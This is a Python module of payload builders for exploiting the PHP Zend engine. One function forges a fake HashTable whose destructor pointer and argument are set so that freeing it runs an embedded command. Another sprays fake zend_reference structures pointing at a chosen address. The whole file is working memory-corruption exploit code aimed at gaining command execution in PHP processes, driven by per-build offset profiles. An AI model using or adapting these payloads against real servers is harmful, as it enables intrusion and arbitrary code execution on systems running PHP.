"""Zend ABI payload encoders shared by the profile-driven strategies.

The fake HashTable/execute-data layout and reference overlays are generalized
from the MIT-licensed framework already attributed in THIRD_PARTY_NOTICES.md.
All offsets and type tags come from the exact-build profile.
"""

from __future__ import annotations

import struct
from typing import Any, Mapping

from profile import ProfileError, layout_offsets, parse_hex


def _offsets(section: Mapping[str, Any], label: str) -> dict[str, int]:
    return {key: parse_hex(value, f"{label}.{key}") for key, value in section.items()}


def place_zend_string_header(
    buffer: bytearray,
    offset: int,
    *,
    length: int,
    refcount: int = 0,
    type_info: int = 0x16,
    hash_value: int = 0,
) -> None:
    if offset < 0 or offset + 0x18 > len(buffer):
        raise ProfileError("zend_string header falls outside its carrier")
    struct.pack_into("<IIQQ", buffer, offset, refcount, type_info, hash_value, length)


def build_destructor_payload(
    abi: Mapping[str, Any],
    table_address: int,
    destructor: int,
    command: bytes,
    *,
    carrier_size: int | None = None,
) -> bytes:
    zarray = _offsets(abi["zend_array"], "zend_array")
    execute = _offsets(abi["zend_execute_data"], "zend_execute_data")
    zval = _offsets(abi["zval"], "zval")
    zstring = _offsets(abi["zend_string"], "zend_string")
    types = _offsets(abi["types"], "types")
    execute_base, string_base, command_offset = layout_offsets(abi)
    required = command_offset + len(command) + 1
    size = required if carrier_size is None else carrier_size
    if size < required:
        raise ProfileError("fixed proof command does not fit in the profiled carrier")
    payload = bytearray(size)

    scalar_writes = (
        ("<I", zarray["gc"], 1),
        ("<I", zarray["gc"] + 4, types["is_array"]),
        ("<I", zarray["flags"], 0x10),
        ("<I", zarray["table_mask"], 0xFFFFFFF8),
        ("<Q", zarray["ar_data"], table_address + execute_base),
        ("<I", zarray["num_used"], 1),
        ("<I", zarray["num_elements"], 1),
        ("<I", zarray["table_size"], 8),
        ("<I", zarray["internal_pointer"], 0),
        ("<Q", zarray["next_free"], 0),
        ("<Q", zarray["destructor"], destructor),
        ("<Q", execute_base + execute["return_value"], destructor),
        ("<I", execute_base + execute["num_args"], 1),
        ("<Q", execute_base + execute["arg1"] + zval["value"], table_address + string_base),
        ("<I", execute_base + execute["arg1"] + zval["type_info"], types["is_string"]),
        ("<I", string_base, 1),
        ("<I", string_base + 4, types["gc_string"]),
        ("<Q", string_base + zstring["len"], len(command)),
    )
    for fmt, offset, value in scalar_writes:
        struct.pack_into(fmt, payload, offset, value)
    payload[command_offset:command_offset + len(command)] = command
    return bytes(payload)


def build_reference_tiles(
    abi: Mapping[str, Any],
    array_address: int,
    *,
    carrier_size: int,
    refcount: int,
    first_offset: int,
    stride: int,
    fill: int = 0x53,
) -> bytes:
    zref = _offsets(abi["zend_reference"], "zend_reference")
    zval = _offsets(abi["zval"], "zval")
    types = _offsets(abi["types"], "types")
    value = bytearray([fill]) * carrier_size
    for base in range(first_offset, carrier_size - zref["size"] + 1, stride):
        writes = (
            ("<I", base + zref["gc"], refcount),
            ("<I", base + zref["gc"] + 4, types["is_reference"]),
            ("<Q", base + zref["val"] + zval["value"], array_address),
            ("<I", base + zref["val"] + zval["type_info"], types["array_ex"]),
            ("<Q", base + zref["sources"], 0),
        )
        for fmt, offset, number in writes:
            struct.pack_into(fmt, value, offset, number)
    return bytes(value)
